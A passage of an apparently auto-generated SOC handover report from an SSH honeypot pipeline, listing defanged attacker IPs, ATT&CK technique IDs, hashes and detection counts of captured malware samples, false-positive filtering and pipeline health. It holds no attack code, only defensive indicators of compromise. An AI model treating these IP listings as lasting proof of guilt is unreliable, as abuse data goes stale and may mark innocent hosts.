| `49.124.148[.]194` | 1 | 2026-03-29 19:59 | 2026-03-29 19:59 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `58.17.6[.]119` | 1 | 2026-03-29 19:22 | 2026-03-29 19:22 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `65.20.204[.]88` | 1 | 2026-03-29 19:11 | 2026-03-29 19:11 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `67.85.146[.]216` | 1 | 2026-03-29 18:42 | 2026-03-29 18:42 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `78.187.9[.]111` | 1 | 2026-03-29 20:10 | 2026-03-29 20:10 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `78.197.6[.]173` | 1 | 2026-03-29 19:50 | 2026-03-29 19:50 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `90.230.226[.]175` | 1 | 2026-03-29 20:00 | 2026-03-29 20:00 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **28/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `103.251.31[.]26` | IN | Bharti Airtel Limited | **100** ⚠️ | 26 |
| `78.197.6[.]173` | FR | Free SAS | **100** ⚠️ | 50 |
| `49.124.148[.]194` | MY | DiGi Telecommunications Sdn Bhd | **100** ⚠️ | 12 |
| `65.20.204[.]88` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 50 |
| `67.85.146[.]216` | US | Optimum Online (Cablevision Systems) | **100** ⚠️ | 11 |
| `78.187.9[.]111` | TR | Turk Telekomunikasyon Anonim Sirketi | **100** ⚠️ | 6 |
| `90.230.226[.]175` | SE | Telia Network Services | **100** ⚠️ | 13 |
| `164.92.168[.]97` | DE | DigitalOcean, LLC | **100** ⚠️ | 33 |
| `103.23.198[.]244` | ID | PT Cloud Hosting Indonesia | **100** ⚠️ | 50 |
| `18.191.16[.]102` | US | Amazon Technologies Inc. | **100** ⚠️ | 11 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 34 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 21 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 9 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 4 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 4 |

---

## 🔕 False Positive Summary (5 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 4 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 46 cases |
| Tool 34  | Credential Extractor        | ✅ 30 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 32 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 5 filtered (10.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 28 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 9 priority case(s) shown individually · 25 recon entry/entries in table (5 group(s) consolidating 12 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-29T20:29:52Z_
